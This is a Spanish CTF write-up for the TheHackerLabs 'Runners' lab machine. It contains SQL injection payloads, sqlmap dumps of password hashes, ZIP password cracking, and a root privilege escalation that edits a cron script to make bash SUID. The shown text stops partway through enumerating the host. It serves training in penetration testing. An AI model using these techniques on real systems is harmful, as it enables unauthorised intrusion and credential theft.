---
title: "Runners - TheHackerLabs"
date: 2025-07-30
draft: false
slug: "THL-writeup-runners"
excerpt: "Esta es una máquina sencilla, pero que necesita mucho trabajo para resolverla. Después de analizar los escaneos, entramos en la página web activa en el puerto 80. Analizándola, descubrimos que es vulnerable a inyecciones SQL. Para automatizar el uso de inyecciones SQL, utilizamos la herramienta SQLMAP, con lo que podemos dumpear una tabla que contiene un usuario y contraseña válidos para entrar en el servicio SSH del puerto 2222. Dentro de este servicio, descubrimos que se trata de un contenedor de Docker. Enumerando un poco, encontramos un archivo ZIP dentro de un directorio oculto de nuestro usuario. Lo descargamos y crackeamos, resultando en la contraseña de otro usuario del contenedor de Docker. Entrando como este nuevo usuario, descubrimos un script que se ejecuta cada minuto como una tarea CRON. Modificamos el script para que le dé permisos SUID a la Bash, siendo así que logramos escalar privilegios en el contenedor y convertirnos en Root. Ya como Root, encontramos un archivo de texto en su directorio, que contiene un usuario y contraseña del servicio SSH de la máquina víctima. Dentro, encontramos un archivo de la aplicación Password Safe, que logramos crackear y ver su contenido. Ahí encontramos la contraseña para otro usuario de la máquina víctima. Entrando como este nuevo usuario, identificamos que está dentro del grupo Docker, lo que nos permite abusar de este y crear una montura de la raíz de la máquina víctima en un contenedor. Dicha montura puede generar cambios fuera del contenedor, entonces, si le damos permisos SUID a la Bash del contenedor, la Bash de la máquina víctima también se verá afectada, siendo esta forma con la que logramos escalar privilegios y ser Root de la máquina víctima."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "MySQL", "Docker", "Password Safe Aplication", "Web Enumeration", "Fuzzing", "SQL Injection", "SQL Injection (Boolean-Based Blind)", "SQLi Automatization (SQLi)", "Cracking Hash", "Cracking ZIP File", "Docker Container Enumeration", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "Cracking Password Safe File", "Abusing Docker Group", "Privesc - Abusing Docker Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "sqlmap"
  - "ssh"
  - "hostname"
  - "cat"
  - "grep"
  - "scp"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "libreoffice"
  - "python3"
  - "wget"
  - "chmod"
  - "pspy64"
  - "bash"
  - "sudo"
  - "pwsafe2john"
  - "apt"
  - "pwsafe"
  - "id"
  - "docker"
links:
  - "https://portswigger.net/web-security/sql-injection/cheat-sheet"
  - "https://github.com/DominicBreuker/pspy"
  - "https://gtfobins.github.io/gtfobins/docker/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-runners/runers.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.240
PING 192.168.10.240 (192.168.10.240) 56(84) bytes of data.
64 bytes from 192.168.10.240: icmp_seq=1 ttl=64 time=1.99 ms
64 bytes from 192.168.10.240: icmp_seq=2 ttl=64 time=0.865 ms
64 bytes from 192.168.10.240: icmp_seq=3 ttl=64 time=1.37 ms
64 bytes from 192.168.10.240: icmp_seq=4 ttl=64 time=1.27 ms

--- 192.168.10.240 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3018ms
rtt min/avg/max/mdev = 0.865/1.374/1.994/0.404 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.240 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 10:04 CST
Initiating ARP Ping Scan at 10:04
Scanning 192.168.10.240 [1 port]
Completed ARP Ping Scan at 10:05, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:05
Scanning 192.168.10.240 [65535 ports]
Discovered open port 22/tcp on 192.168.10.240
Discovered open port 80/tcp on 192.168.10.240
Discovered open port 2222/tcp on 192.168.10.240
Completed SYN Stealth Scan at 10:05, 14.99s elapsed (65535 total ports)
Nmap scan report for 192.168.10.240
Host is up, received arp-response (0.0051s latency).
Scanned at 2025-07-30 10:05:00 CST for 15s
Not shown: 59300 closed tcp ports (reset), 6232 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
           Raw packets sent: 78012 (3.433MB) | Rcvd: 59304 (2.372MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos. Supongo que la intrusión será por el **puerto 80**, pero debe haber algo en ese **puerto 2222**.

### Escaneo de Servicios {#Servicios}

```bash
map -sCV -p 22,80,2222 192.168.10.240 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 10:07 CST
Nmap scan report for 192.168.10.240
Host is up (0.0013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 a9:95:53:cd:44:32:5e:69:4a:83:e6:e5:2d:bf:eb:82 (ECDSA)
|_  256 7b:cd:42:3f:1f:7d:aa:f3:58:8f:7d:85:93:c5:fa:01 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Runners Unlimited
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   3072 da:58:27:97:82:a0:b0:c5:96:bc:69:7d:05:a0:c9:34 (RSA)
|   256 fd:ce:34:44:25:fe:ee:6b:89:46:2d:05:eb:dc:86:f1 (ECDSA)
|_  256 7f:19:1b:7a:ba:aa:4f:65:62:f1:51:cf:89:c6:e7:b3 (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Ese **puerto 2222** me da la impresión de que es un contenedor de **Docker**. Además, el escaneo parece mostrar algo de contenido de la página web activa.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura1.png">
</p>

Esta página es un blog para corredores.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura2.png">
</p>

No hay mucho que destacar.

Si navegamos un poco por la página, descubriremos que todas las páginas fueron hechas en **PHP**, pero hay algunas en específico que muestran el parámetro **id**:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura3.png">
</p>

Esto me hace pensar que es posible que se pueda aplicar una **Inyección SQL**, porque los artículos están ordenados por su **ID**, pero esto lo probaremos más adelante.

Mientras, apliquemos **Fuzzing** para ver si no hay algún directorio o archivo oculto.

### Fuzzing {#fuzz}

Primero utilicemos **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.240/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.240/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

about.php               [Status: 200, Size: 9745, Words: 1095, Lines: 144, Duration: 30ms]
assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 21ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1463ms]
index.php               [Status: 200, Size: 6178, Words: 407, Lines: 114, Duration: 1521ms]
post.php                [Status: 200, Size: 4395, Words: 240, Lines: 109, Duration: 48ms]
posts.php               [Status: 200, Size: 5235, Words: 326, Lines: 97, Duration: 11ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
README.txt              [Status: 200, Size: 820, Words: 96, Lines: 30, Duration: 27ms]
elements.html           [Status: 200, Size: 25373, Words: 1481, Lines: 543, Duration: 18ms]
LICENSE.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64, Duration: 294ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 219ms]
                        [Status: 200, Size: 6178, Words: 407, Lines: 114, Duration: 220ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 8917ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1006ms]
:: Progress: [882180/882180] :: Job [1/1] :: 238 req/sec :: Duration: [0:16:51] :: Errors: 1571 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para indicar extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.240/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.240/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.10.240/images/]
/about.php            (Status: 200) [Size: 9745]
/assets               (Status: 301) [Size: 319] [--> http://192.168.10.240/assets/]
/post.php             (Status: 200) [Size: 4395]
/posts.php            (Status: 200) [Size: 5235]
/db.php               (Status: 200) [Size: 0]
/README.txt           (Status: 200) [Size: 820]
/index.php            (Status: 200) [Size: 6178]
/elements.html        (Status: 200) [Size: 25373]
/LICENSE.txt          (Status: 200) [Size: 17128]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones de archivos a buscar. |

Podemos ver varias páginas que podemos visitar, pero no es nada que no podamos hacer desde la página principal. 

A excepción de la página **db.php**, que no muestra nada, las demás no muestran algo interesante.

Entonces, vamos a probar si la página web es vulnerable a **Inyecciones SQL**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando e Identificando Tipo de Inyección SQL {#SQLi}

Vemos que hay 5 artículos que se muestran en la página **posts.php** y puedes ir cambiando a cada uno desde la URL, jugando con el parámetro **id**.

Pero, ¿qué pasa si ponemos un número mayor a 5?

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura4.png">
</p>

Obtenemos un error.

Esto quiere decir que, si el parámetro **id** no cumple con el valor de alguno de los posts existentes, que son 5, obtendremos un error.

Supongamos que la consulta que se está ocupando es la siguiente:
```bash
select post from posts where id=1;
```
Esta clase de consultas sin sanitización puede resultar en varios tipos de **Inyecciones SQL**.

Pero por el momento, la idea es que podamos aplicar una inyección que NO provoque la página de error y, en este caso, que nos muestre el post que queramos (**SQL Injection Error-Based**).

El problema es que si usamos una comilla simple, como en otros casos, no parece funcionar.

Podemos probar una **inyección SQL** específica para un tipo de gestor de base de datos. Aquí te dejo el **Cheat Sheet de PortSwigger** que muestra las sintaxis para distintos gestores de bases de datos:
* <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">PortSwigger: SQL Injection Cheat Sheet</a>

Si probamos una inyección para **MySQL**, ya no mostrará el error:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura5.png">
</p>

Comprobamos que podemos aplicar **Inyecciones SQL Basadas en Errores (SQLi Error-Based)**.

Podemos tratar de obtener la cantidad de columnas usadas en la BD, resultando en ser 3 columnas:
```bash
id=1 order by 3--%20
```

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura6.png">
</p>

Esto puede dar en **Inyecciones SQL Basadas en Uniones (SQLi UNION-Based)**.

El problema es que si intentamos aplicar una de estas inyecciones, para tratar de ver algún dato representado en la página, no se verá nada en ningún lado:
```bash
id=1 union select version@@,2,3--%20
```

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura7.png">
</p>

Pero si usamos una condicional, no mostrará ningún error a menos que la condicional sea incorrecta (por ejemplo, `1=2`):
```bash
id=1 and 1=1--%20
```

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura8.png">
</p>

Esto quiere decir que podemos aplicar **Inyecciones SQL Basadas en Booleanos y Ciegas (SQLi Boolean Based Blind)**.

Por último, veamos qué ocurre si tratamos de provocar un retardo de 5 segundos:
```bash
id=1 and sleep(5)--%20
```

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura9.png">
</p>

Tardó exactamente 5 segundos en cargar la página y nos mostró la página de error, por lo que descubrimos que también se pueden aplicar **Inyecciones SQL Basadas en Tiempo y Ciegas (SQLi Time-Based Blind)**.

Llegados a este punto, podemos elegir si queremos aplicar cualquiera de las siguientes inyecciones para tratar de obtener datos de la base de datos:
* **Inyecciones SQL Basadas en Booleanos y Ciegas (SQLi Boolean Based Blind)**
* **Inyecciones SQL Basadas en Tiempo y Ciegas (SQLi Time-Based Blind)**

Pero nos tardaremos mucho, así que vamos a optimizar ese tiempo usando la herramienta **SQLMAP**.

### Dumpeando Datos de Base de Datos MySQL con SQLMAP {#SQLMAP}

Veamos si la página es vulnerable a **Inyecciones SQL** y qué clase de inyecciones podemos aplicar:
```bash
sqlmap -u 'http://192.168.10.240/post.php?id=1' --batch
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3177=3177

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1961 FROM (SELECT(SLEEP(5)))hJOx)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5438 UNION ALL SELECT CONCAT(0x716a6a7171,0x56596b76615768567750667478796f77635448704f57596c786a5168694d727551794d626c685370,0x7176767871),NULL,NULL-- -
---
[09:22:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
...
```

| Parámetros | Descripción |
|---|---|
| *-u*	     | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |

Observa que son justamente las que descubrimos manualmente.

Obtengamos las bases de datos existentes:
```bash
sqlmap -u 'http://192.168.10.240/post.php?id=1' --batch --dbs
...
[09:14:25] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] performance_schema
...
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |

Tenemos 3 BDs, 2 por defecto y la que se está usando actualmente.

Obtengamos las tablas de la base de datos **blog**:
```bash
sqlmap -u 'http://192.168.10.240/post.php?id=1' --batch -D 'blog' --tables
...
[09:23:54] [INFO] fetching tables for database: 'blog'
Database: blog
[3 tables]
+----------+

| comments |
| posts    |
| users    |
+----------+
...
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *-D*	     | Selecciona una base de datos especifica a enumerar. |
| *--tables* | Enumera las tablas de una base de datos específica. |

Hay 3 tablas y ahí podemos ver la tabla **users**.

Obtengamos las columnas de esa tabla:
```bash
sqlmap -u 'http://192.168.10.240/post.php?id=1' --batch -D 'blog' -T 'users' --columns
...
[09:24:17] [INFO] fetching columns for table 'users' in database 'blog'
Database: blog
Table: users
[3 columns]
+----------+--------------+

| Column   | Type         |
+----------+--------------+

| id       | int          |
| password | varchar(255) |
| username | varchar(100) |
+----------+--------------+
...
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *-D*       | Selecciona una base de datos especifica a enumerar. |
| *-T*       | Selecciona una tabla especifica a enumerar. |
| *--columns* | Enumera las columnas de una tabla específica. |

Excelente, ahí se encuentra un usuario y contraseña.

Obtengamos esos datos, dumpeando toda la tabla:
```bash
sqlmap -u 'http://192.168.10.240/post.php?id=1' --batch -D 'blog' -T 'users' --dump
...
[09:24:37] [INFO] cracked password 'runner' for user 'david'                                                                                                                                 
Database: blog                                                                                                                                                                               
Table: users
[3 entries]
+----+---------------------------------------------------------------------------+----------+

| id | password                                                                  | username |
+----+---------------------------------------------------------------------------+----------+

| 1  | 527aa9f431539da8e151d5434d1d5e611d973f601d8e970790882624554146b0 (runner) | david    |
| 2  | 7927e941a969cdf471354e79b7ae29ae25ca04d59f66d6c19f9c43a9367ec498          | maria    |
| 3  | febb36d29baf28da1a00cad0cc6937d49f13738ff9dd88276e7c85920d2bff40          | ian      |
+----+---------------------------------------------------------------------------+----------+
...
```

| Parámetros | Descripción |
|---|---|
| *-u*	     | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *-D*       | Selecciona una base de datos específica a enumerar. |
| *-T*       | Selecciona una tabla específica a enumerar. |
| *--dump*   | Extraer datos de una tabla específica. |

Muy bien, tenemos un usuario y su contraseña que **SQLMAP** pudo crackear.

Estas credenciales servirán en el **servicio SSH** del **puerto 2222**:
```bash
ssh david@192.168.10.240 -p 2222
david@192.168.10.240's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-49-generic x86_64)
...
Last login: Wed Jul 30 15:27:02 2025
david@30acf6ca1fb6:~$ whoami
david
```
Estamos dentro.

Podemos ver que sí es un **contenedor de Docker** por cómo se representa el prompt de la shell, y de igual forma podemos comprobarlo:
```bash
david@30acf6ca1fb6:~$ hostname -I
172.20.0.2
```

## Post Explotación {#Post}

### Enumeración del Contenedor Docker, Crackeo de Archivo ZIP y Ganando Acceso como Usuario Maria {#dockerEnum}

Veamos qué usuarios existen en el contenedor:
```bash
david@30acf6ca1fb6:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000::/home/david:/bin/bash
maria:x:1001:1001::/home/maria:/bin/bash
```

Existe el **usuario maria** y podemos ver el contenido de su directorio, pero no hay nada ahí:
```bash
david@30acf6ca1fb6:~$ ls -la /home/maria/
total 3064
drwxr-xr-x 3 maria maria    4096 Jul 30 15:41 .
drwxr-xr-x 1 root  root     4096 Nov 28  2024 ..
lrwxrwxrwx 1 root  root        9 Nov 28  2024 .bash_history -> /dev/null
-rw-r--r-- 1 maria maria     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 maria maria    3771 Feb 25  2020 .bashrc
drwx------ 2 maria maria    4096 Nov 28  2024 .cache
-rw-r--r-- 1 maria maria     807 Feb 25  2020 .profile
-rw-rw-r-- 1 maria maria       0 Dec  2  2024 .selected_editor
-rw------- 1 maria maria    6010 Jul 30 15:41 .viminfo
```

En el directorio `/opt`, encontraremos un directorio que contiene un script:
```bash
david@30acf6ca1fb6:~$ ls -la /opt/scripts/
total 12
drwxr-xr-x 2 root root  4096 Dec  2  2024 .
drwxr-xr-x 1 root root  4096 Nov 28  2024 ..
-rwxrwx--x 1 root maria  818 Jul 30 15:41 backup.sh
```
Este script lo puede ver y modificar el **usuario Root** y el **usuario maria**. 

Este será importante más adelante.

Revisando los archivos de nuestro usuario actual, veremos un directorio oculto:
```bash
david@30acf6ca1fb6:~$ ls -la
total 28
drwxr-xr-x 4 david david 4096 Nov 28  2024 .
drwxr-xr-x 1 root  root  4096 Nov 28  2024 ..
lrwxrwxrwx 1 root  root     9 Nov 28  2024 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 david david 3771 Feb 25  2020 .bashrc
drwx------ 2 david david 4096 Nov 28  2024 .cache
drwxr-xr-x 2 david david 4096 Nov 28  2024 .hidden
-rw-r--r-- 1 david david  807 Feb 25  2020 .profile
```

Veamos su contenido:
```bash
david@30acf6ca1fb6:~$ ls -la .hidden/
total 16
drwxr-xr-x 2 david david 4096 Nov 28  2024 .
drwxr-xr-x 4 david david 4096 Nov 28  2024 ..
-rw-r--r-- 1 david david 4928 Nov 28  2024 credenciales.zip
```
Es un **archivo ZIP**.

Descarguémoslo en nuestra máquina con **scp**:
```bash
scp -P 2222 david@192.168.10.240:/home/david/.hidden/credenciales.zip .
david@192.168.100.108's password: 
credenciales.zip
```

Si lo tratamos de descomprimir, nos pide una contraseña:
```bash
unzip credenciales.zip
Archive:  credenciales.zip
[credenciales.zip] credenciales.xlsx password:
```
Vamos a crackear este archivo.

Primero, obtengamos el hash del archivo:
```bash
zip2john credenciales.zip > hash
ver 2.0 efh 5455 efh 7875 credenciales.zip/credenciales.xlsx PKZIP Encr: TS_chk, cmplen=4728, decmplen=5346, crc=BA8EA891 ts=7424 cs=7424 type=8
```

Crackeemos ese hash con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockandroll      (credenciales.zip/credenciales.xlsx)     
1g 0:00:00:00 DONE (2025-07-30 09:30) 25.00g/s 307200p/s 307200c/s 307200C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Bien, al descomprimir ese archivo, obtenemos un **Excel** que podemos abrir con **libreoffice**:
```bash
libreoffice credenciales.xlsx
```

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura10.png">
</p>

Tenemos la contraseña del **usuario maria**.

Autentiquemonos como este usuario:
```bash
ssh maria@192.168.10.240 -p 2222
maria@192.168.10.240's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-49-generic x86_64)
...
Last login: Mon Dec  2 15:57:37 2024
maria@30acf6ca1fb6:~$ whoami
maria
```

### Modificando Script y Abusando de Tarea CRON de Contenedor para Escalar Privilegios y Ganar Acceso a la Máquina Víctima {#Script}

Ya como el **usuario maria**, podemos ver y modificar el script que habíamos encontrado en la ruta `/opt/scripts`:
```bash
maria@30acf6ca1fb6:~$ cat /opt/scripts/backup.sh 
#!/bin/bash

BACKUP_DIR="/srv/backups"
DB_NAME="blog"
DB_USER="root"
ZIP_PASSWORD="metallica"

BACKUP_FILE="$BACKUP_DIR/blog_backup_$(date +'%Y%m%d%H%M').sql"
/usr/bin/mysqldump -u $DB_USER $DB_NAME > $BACKUP_FILE

zip -P "$ZIP_PASSWORD" "${BACKUP_FILE}.zip" "$BACKUP_FILE"

rm -f "$BACKUP_FILE"

echo "$(date): Backup comprimido de la base de datos '$DB_NAME' creado en ${BACKUP_FILE}.zip" >> /var/log/backup.log

function cleanup_backups {
    local total_backups=$(ls -1t "$BACKUP_DIR"/*.zip 2>/dev/null | wc -l)

    if (( total_backups > 10 )); then
        ls -1t "$BACKUP_DIR"/*.zip | tail -n +11 | while read -r old_backup; do
            rm -f "$old_backup"
            echo "$(date): Backup antiguo eliminado: $old_backup" >> /var/log/backup.log
        done
    fi
}

cleanup_backups
```
Este script realiza un respaldo automático de la base de datos **MySQL**, lo comprime y cifra con contraseña, guarda un log, y elimina los backups más antiguos para conservar solo los más recientes.

Además, ese script nos está dando una contraseña para un **archivo ZIP**. Guardémosla para más adelante.

También parece que está hecho para ejecutarse cada cierto tiempo, como una **tarea CRON**.

Vamos a comprobarlo con la herramienta **pspy64**:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Una vez que lo descargues, levanta un servidor con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Lo descargamos con **wget** desde el contenedor:
```bash
maria@30acf6ca1fb6:~$ wget http://Tu_IP/pspy64
```

Y lo ejecutamos:
```bash
maria@30acf6ca1fb6:~$ chmod +x pspy64
maria@30acf6ca1fb6:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░
...
2025/07/30 15:37:01 CMD: UID=0     PID=1276   | /bin/sh -c /opt/scripts/backup.sh 
2025/07/30 15:37:01 CMD: UID=0     PID=1277   | /bin/bash /opt/scripts/backup.sh 
```
Se está ejecutando cada minuto y quien lo ejecuta es el **Root**.

Como podemos modificar este script, tan solo le podemos agregar una instrucción para que le dé **permisos SUID** a la **Bash**.

Usa **vim** o **vi** para modificar el script:
```bash
maria@30acf6ca1fb6:~$ cat /opt/scripts/backup.sh 
#!/bin/bash

chmod u+s /bin/bash
```

Espera un minuto y revisa los permisos de la **Bash**:
```bash
maria@30acf6ca1fb6:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Ejecuta la **Bash** con privilegios y seremos **Root**:
```bash
maria@30acf6ca1fb6:~$ bash -p
bash-5.0# whoami
root
```
Ya somos **Root**.

Si nos movemos a su directorio, veremos un archivo de texto:
```bash
bash-5.0# cd /root
bash-5.0# ls
TODO_LIST.txt
```

Leámoslo:
```bash
bash-5.0# cat TODO_LIST.txt 
1. Crear un script para automatizar los backups de la base de datos. (OK)
2. Cifrar las contraseñas de la base de datos. (OK)
3. Avisar a Ian para que cambie su contraseña, a ver si deja usar su famosa contraseña "******" en todos lados. (Pendiente)
```
Tenemos un usuario y contraseña.

Probémoslo con el **servicio SSH** del **puerto 22**:
```bash
ssh ian@192.168.10.240
ian@192.168.10.240's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-49-generic x86_64)
...
Last login: Thu Nov 28 20:42:23 2024
ian@TheHackersLabs-Runners:~$ whoami
ian
```
Estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
ian@TheHackersLabs-Runners:~$ ls
user.txt
ian@TheHackersLabs-Runners:~$ cat user.txt
...
```

### Enumeración de Máquina Víctima y Crackeo de Archivo psafe {#linEnum}

Este usuario no tiene ningún privilegio:
```bash
ian@TheHackersLabs-Runners:~$ sudo -l
[sudo] password for ian: 
Sorry, user ian may not run sudo on TheHackersLabs-Runners.
```

Veamos qué usuarios existen en la máquina:
```bash
ian@TheHackersLabs-Runners:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
elliot:x:1000:1000:Elliot Alderson:/home/elliot:/bin/bash
ian:x:1001:1001::/home/ian:/bin/bash
```
Tenemos 2 usuarios.

Podemos ver el contenido del **usuario elliot**:
```bash
ian@TheHackersLabs-Runners:~$ ls -la /home
total 16
